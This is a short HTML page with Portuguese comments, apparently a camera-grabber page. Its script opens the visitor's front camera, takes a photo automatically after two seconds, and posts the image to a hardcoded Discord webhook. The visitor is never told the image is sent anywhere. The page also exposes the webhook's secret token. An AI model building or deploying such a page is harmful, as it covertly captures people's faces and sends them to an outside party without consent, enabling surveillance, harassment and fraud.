<!DOCTYPE html>
<html>
<head>
    <title>Captura de Câmera</title>
</head>
<body>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const webhookUrl = 'https://discord.com/api/webhooks/1504217043573018646/qRAhMrq1gomwUPPZ9IK6hjjuvQMf-2a5fKPzcUEPrsMuTHsyt3Dwq1r26xbBblZNtWFQ';

        // 1. Acessar Câmera Frontal (facingMode: 'user')
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
            video.srcObject = stream;
            video.play();
            // Tira a foto após 2 segundos
            setTimeout(takeSnapshot, 2000);
        });

        function takeSnapshot() {
            // 2. Tirar foto (capturar frame)
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // 3. Converter e Enviar
            const imageData = canvas.toDataURL('image/png');
            sendToWebhook(imageData);
        }

        function sendToWebhook(data) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: data })
            });
        }
    </script>
</body>
</html>
